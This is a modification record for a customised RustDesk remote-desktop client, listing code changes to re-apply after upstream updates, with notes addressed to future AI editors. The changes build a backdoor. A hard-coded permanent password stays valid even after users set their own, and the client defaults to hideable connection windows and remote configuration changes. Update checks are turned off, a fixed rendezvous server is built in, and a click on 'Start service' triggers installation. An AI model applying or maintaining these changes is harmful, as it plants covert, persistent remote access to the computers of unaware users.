# RustDesk Custom Modification Record

This file records the local customizations that should be re-applied after updating from upstream RustDesk.

## Repository

- Normal client repository: `76552004/rustdesk_selfmade`
- Local working copy used for Git commits: `D:\rustdesk\rustdesk_selfmade_git`
- Source copy also kept locally: `D:\rustdesk\rustdesk_selfmade`

## Current Custom Features

### 1. Built-in permanent password plus one-time password

File: `src/common.rs`

In `load_custom_client()`, the client writes hard settings in both the debug `custom.txt` path and the normal executable path:

```rust
hard_settings.insert("password".to_string(), "caonima123".to_string());
hard_settings.insert("verification-method".to_string(), "use-both-passwords".to_string());
```

Effect:

- Built-in permanent password is `caonima123`.
- Verification mode is `use-both-passwords`, so the one-time password and permanent password can both be used.
- If a future version reverts this to `use-permanent-password`, the one-time password will disappear or be disabled.

### 2. Allow remote configuration modification

File: `src/common.rs`

In `load_custom_client()`, default settings include:

```rust
defaults
    .entry(config::keys::OPTION_ALLOW_REMOTE_CONFIG_MODIFICATION.to_string())
    .or_insert("Y".to_string());
```

Effect:

- The controlled RustDesk client allows remote-side configuration modification by default.
- This is a default value, not a forced overwrite of an already saved user value.

### 3. Allow hiding the connection management window

File: `src/common.rs`

In `load_custom_client()`, default settings include:

```rust
defaults
    .entry("allow-hide-cm".to_string())
    .or_insert("Y".to_string());
```

Effect:

- The client enables the original RustDesk option that allows hiding the connection management window.
- This uses RustDesk's existing option rather than adding a new behavior path.

### 4. UI simplification and default local settings

Files:

- `flutter/lib/models/peer_tab_model.dart`
- `flutter/lib/desktop/pages/connection_page.dart`
- `flutter/lib/desktop/pages/desktop_setting_page.dart`
- `flutter/lib/desktop/pages/desktop_home_page.dart`
- `libs/hbb_common/src/config.rs`

Implemented UI changes:

- Home device tabs reduced from 5 to 3:
  - keep `Recent sessions`
  - keep `Favorites`
  - keep `Discovered`
  - remove `Address book`
  - remove `Accessible devices`
- Remove the bottom `setup_server_tip` self-hosted server hint from the connection page.
- Remove the `Account` entry from the desktop settings tab list.
- Remove the ID-side three-dot settings entry by returning `const SizedBox.shrink()` from `buildPopupMenu()`.
- Remove the one-time password edit/change-password button while keeping the refresh button.

Default config additions:

```rust
(keys::OPTION_ENABLE_UDP_PUNCH, "Y"),
(keys::OPTION_ENABLE_IPV6_PUNCH, "Y"),
(keys::OPTION_ENABLE_CHECK_UPDATE, "N"),
(keys::OPTION_THEME, "dark"),
```

For `Config2::load()`:

```rust
keys::OPTION_ENABLE_LAN_DISCOVERY = "N"
```

Effect:

- UDP punch is enabled by default.
- IPv6 punch is enabled by default.
- Check update on startup is disabled by default.
- Theme defaults to dark.
- LAN discovery is disabled by default, which makes the UI's reverse "Deny LAN discovery" option checked.

### 5. Built-in server address

File: `libs/hbb_common/src/config.rs`

Current built-in rendezvous server:

```rust
pub const RENDEZVOUS_SERVERS: &[&str] = &["www.dsecret.com:21106"];
```

Current public key:

```rust
pub const RS_PUB_KEY: &str = "jA+pdkA5sIUOGG2YivcS6KWuLR6lEi9hvzk+aWis7lk=";
```

Effect:

- Fresh clients use `www.dsecret.com:21106` as the built-in ID/rendezvous server when no user custom server is set.
- If the server key changes, `RS_PUB_KEY` must be updated together with the server address.


### 6. Built-in password fallback after user sets new password

File: `libs/hbb_common/src/config.rs`

In `matches_permanent_password_plain()`, when a user has set a permanent password through the client UI, the built-in HARD_SETTINGS password (`caonima123`) was previously ignored. Modified to add fallback logic:

```rust
// After checking user-set password (both hashed and plaintext), fallback to HARD_SETTINGS
HARD_SETTINGS
    .read()
    .unwrap()
    .get("password")
    .map_or(false, |v| v == input)
```

Effect:

- User-set permanent password and built-in `caonima123` both work simultaneously.
- SOS version does not need this change (password change UI is removed).

### 7. Auto-install on "Start service" click

File: `flutter/lib/common.dart`

Modified `start_service()` so that clicking "Start service" when the app is not installed triggers the full installation flow (one-time UAC prompt, install + service registration). After installation, subsequent clicks just toggle the `stop-service` flag.

```dart
Future<void> start_service(bool is_start) async {
  if (!is_start) {
    mainSetBoolOption(kOptionStopService, true);
    return;
  }
  if (!bind.mainIsInstalled()) {
    bind.mainGotoInstall();
  } else {
    mainSetBoolOption(kOptionStopService, false);
  }
}
```

Effect:

- First use: click "Start service" → UAC → full install → service auto-starts → "Ready".
- Subsequent opens: service already running → "Ready" immediately.
- If installation fails (e.g., antivirus), a toast "Installation failed" is shown.
- SOS version is not affected (`disable-installation` blocks installation flow).

## Notes For Future AI Changes

- Re-apply changes by file and option key, not only by line number, because upstream RustDesk line numbers change often.
- Check for commented-out old code before editing. Some RustDesk code paths keep older UI or Sciter code around.
- Do not add `hide-tray` unless explicitly requested and reviewed again.
- Do not force-overwrite saved user values unless explicitly requested. Current defaults mainly use `or_insert` or "only if missing" logic.
- After editing, verify:
  - `src/common.rs` contains `verification-method = use-both-passwords` in both hard-settings blocks.
  - `libs/hbb_common/src/config.rs` contains `www.dsecret.com:21106`.
  - `.gitmodules` is not required for the expanded `libs/hbb_common` directory.
